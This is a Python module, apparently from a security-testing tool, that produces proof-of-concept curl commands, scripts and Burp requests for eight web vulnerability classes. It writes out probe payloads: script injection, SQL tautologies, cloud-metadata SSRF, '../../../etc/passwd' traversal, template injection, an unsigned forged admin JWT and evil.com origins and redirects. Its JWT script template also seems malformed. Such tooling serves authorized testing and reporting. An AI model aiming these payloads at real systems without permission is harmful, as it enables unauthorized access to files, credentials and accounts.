from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any


@dataclass
class PoC:
    vulnerability: str
    title: str
    curl_command: str
    python_script: str
    burp_request: str
    description: str
    expected_result: str
    references: list[str] = field(default_factory=list)


class PoCGenerator:
    @staticmethod
    def generate_poc(finding: Any, target: str = "") -> PoC | None:
        category = ""
        if hasattr(finding, "category") and finding.category:
            category = finding.category
        elif isinstance(finding, dict):
            category = finding.get("category", "")

        title = getattr(finding, "title", "") or (isinstance(finding, dict) and finding.get("title", "")) or ""

        generator_map = {
            "xss": PoCGenerator._xss_poc,
            "sqli": PoCGenerator._sqli_poc,
            "ssrf": PoCGenerator._ssrf_poc,
            "lfi": PoCGenerator._lfi_poc,
            "ssti": PoCGenerator._ssti_poc,
            "open-redirect": PoCGenerator._redirect_poc,
            "jwt": PoCGenerator._jwt_poc,
            "cors": PoCGenerator._cors_poc,
        }

        generator = generator_map.get(category.lower().replace(" ", "-").replace("_", "-"))
        if generator:
            return generator(target, title)
        return PoCGenerator._generic_poc(target, title, category)

    @staticmethod
    def _xss_poc(target: str, title: str) -> PoC:
        return PoC(
            vulnerability="Cross-Site Scripting (XSS)",
            title=title or "XSS Vulnerability",
            curl_command=f'curl -s "{target}?q=<script>alert(1)</script>"',
            python_script=f"""import requests
url = "{target}"
payload = {{"q": "<script>alert(1)</script>"}}
resp = requests.get(url, params=payload)
print(resp.text)""",
            burp_request=f"GET /?q=<script>alert(1)</script> HTTP/1.1\nHost: {target}\nUser-Agent: Mozilla/5.0",
            description="Cross-Site Scripting allows attackers to inject client-side scripts into web pages viewed by other users.",
            expected_result="The injected script executes in the victim's browser",
            references=["https://owasp.org/www-community/attacks/xss/", "https://cwe.mitre.org/data/definitions/79.html"],
        )

    @staticmethod
    def _sqli_poc(target: str, title: str) -> PoC:
        return PoC(
            vulnerability="SQL Injection",
            title=title or "SQL Injection Vulnerability",
            curl_command=f"curl -s \"{target}?id=1' OR '1'='1\"",
            python_script=f"""import requests
url = "{target}"
payload = {{"id": "1' OR '1'='1"}}
resp = requests.get(url, params=payload)
# Check for SQL errors in response
if "sql" in resp.text.lower() or "mysql" in resp.text.lower():
    print("SQL Injection confirmed")""",
            burp_request=f"GET /?id=1' OR '1'='1 HTTP/1.1\nHost: {target}",
            description="SQL Injection allows attackers to interfere with database queries.",
            expected_result="Database error messages or unexpected data returned",
            references=[
                "https://owasp.org/www-community/attacks/SQL_Injection/",
                "https://cwe.mitre.org/data/definitions/89.html",
            ],
        )

    @staticmethod
    def _ssrf_poc(target: str, title: str) -> PoC:
        return PoC(
            vulnerability="Server-Side Request Forgery (SSRF)",
            title=title or "SSRF Vulnerability",
            curl_command=f'curl -s "{target}?url=http://169.254.169.254/latest/meta-data/"',
            python_script=f"""import requests
url = "{target}"
payload = {{"url": "http://169.254.169.254/latest/meta-data/"}}
resp = requests.get(url, params=payload)
if "ami-id" in resp.text or "meta-data" in resp.text:
    print("SSRF confirmed - AWS metadata accessible")""",
            burp_request=f"GET /?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1\nHost: {target}",
            description="SSRF allows attackers to make requests from the server to internal services.",
            expected_result="Access to cloud metadata or internal services",
            references=[
                "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery/",
                "https://cwe.mitre.org/data/definitions/918.html",
            ],
        )

    @staticmethod
    def _lfi_poc(target: str, title: str) -> PoC:
        return PoC(
            vulnerability="Local File Inclusion (LFI)",
            title=title or "LFI Vulnerability",
            curl_command=f'curl -s "{target}?file=../../../etc/passwd"',
            python_script=f"""import requests
url = "{target}"
payload = {{"file": "../../../etc/passwd"}}
resp = requests.get(url, params=payload)
if "root:" in resp.text:
    print("LFI confirmed - /etc/passwd accessible")""",
            burp_request=f"GET /?file=../../../etc/passwd HTTP/1.1\nHost: {target}",
            description="LFI allows attackers to read arbitrary files on the server.",
            expected_result="File contents displayed in response",
            references=[
                "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion/",
                "https://cwe.mitre.org/data/definitions/98.html",
            ],
        )

    @staticmethod
    def _ssti_poc(target: str, title: str) -> PoC:
        return PoC(
            vulnerability="Server-Side Template Injection (SSTI)",
            title=title or "SSTI Vulnerability",
            curl_command=f'curl -s "{target}?name={{7*7}}"',
            python_script=f"""import requests
url = "{target}"
# Jinja2 SSTI test
payload = {{"name": "{{7*7}}"}}
resp = requests.get(url, params=payload)
if "49" in resp.text:
    print("SSTI confirmed - template engine evaluates expressions")""",
            burp_request=f"GET /?name={{7*7}} HTTP/1.1\nHost: {target}",
            description="SSTI allows attackers to inject malicious template code.",
            expected_result="Expression evaluated in response (e.g., 49 for {{7*7}})",
            references=[
                "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Server-Side_Template_Injection/",
                "https://cwe.mitre.org/data/definitions/1336.html",
            ],
        )

    @staticmethod
    def _redirect_poc(target: str, title: str) -> PoC:
        return PoC(
            vulnerability="Open Redirect",
            title=title or "Open Redirect Vulnerability",
            curl_command=f'curl -s -L "{target}?redirect=https://evil.com"',
            python_script=f"""import requests
url = "{target}"
payload = {{"redirect": "https://evil.com"}}
resp = requests.get(url, params=payload, allow_redirects=False)
if resp.status_code in (301, 302) and "evil.com" in resp.headers.get("Location", ""):
    print("Open redirect confirmed")""",
            burp_request=f"GET /?redirect=https://evil.com HTTP/1.1\nHost: {target}",
            description="Open redirect allows attackers to redirect users to malicious sites.",
            expected_result="Redirect to external URL",
            references=[
                "https://owasp.org/www-community/vulnerabilities/Open_redirect/",
                "https://cwe.mitre.org/data/definitions/601.html",
            ],
        )

    @staticmethod
    def _jwt_poc(target: str, title: str) -> PoC:
        return PoC(
            vulnerability="JWT Weakness",
            title=title or "JWT Vulnerability",
            curl_command='''curl -s -H "Authorization: Bearer $(python3 -c "import jwt; print(jwt.encode({'sub':'admin'}, '', algorithm='none'))")"'''
            + f" {target}",
            python_script="""import jwt
import requests
# JWT none algorithm attack
token = jwt.encode({"sub": "admin"}, "", algorithm="none")
headers = {"Authorization": f"Bearer {token}"}
resp = requests.get("""
            " + target + "
            """, headers=headers)
if resp.status_code == 200:
    print("JWT none algorithm attack successful")""",
            burp_request=f"GET / HTTP/1.1\nHost: {target}\nAuthorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.",
            description="JWT with 'none' algorithm or weak secret can be forged.",
            expected_result="Access to protected resources without valid credentials",
            references=[
                "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_for_JSON_Web_Tokens/",
                "https://cwe.mitre.org/data/definitions/345.html",
            ],
        )

    @staticmethod
    def _cors_poc(target: str, title: str) -> PoC:
        return PoC(
            vulnerability="CORS Misconfiguration",
            title=title or "CORS Misconfiguration",
            curl_command=f'curl -s -H "Origin: https://evil.com" -H "Host: {target}" {target}',
            python_script=f"""import requests
url = "{target}"
headers = {{"Origin": "https://evil.com"}}
resp = requests.get(url, headers=headers)
cors = resp.headers.get("Access-Control-Allow-Origin", "")
if cors == "*" or "evil.com" in cors:
    print("CORS misconfiguration confirmed")""",
            burp_request=f"GET / HTTP/1.1\nHost: {target}\nOrigin: https://evil.com\nUser-Agent: Mozilla/5.0",
            description="CORS misconfiguration allows cross-origin requests from unauthorized domains.",
            expected_result="Access-Control-Allow-Origin reflects attacker's origin",
            references=[
                "https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny/",
                "https://cwe.mitre.org/data/definitions/942.html",
            ],
        )

    @staticmethod
    def _generic_poc(target: str, title: str, category: str) -> PoC:
        return PoC(
            vulnerability=category or "Generic Vulnerability",
            title=title or "Security Finding",
            curl_command=f"# Manual testing required for this finding type\ncurl -s '{target}'",
            python_script=f"""import requests
# Manual testing required
resp = requests.get('{target}')
print(resp.status_code)""",
            burp_request=f"GET / HTTP/1.1\nHost: {target}",
            description="This finding requires manual investigation.",
            expected_result="Varies based on vulnerability type",
            references=["https://owasp.org/www-project-top-ten/"],
        )


def generate_poc_for_finding(finding: Any, target: str = "") -> PoC | None:
    return PoCGenerator.generate_poc(finding, target)
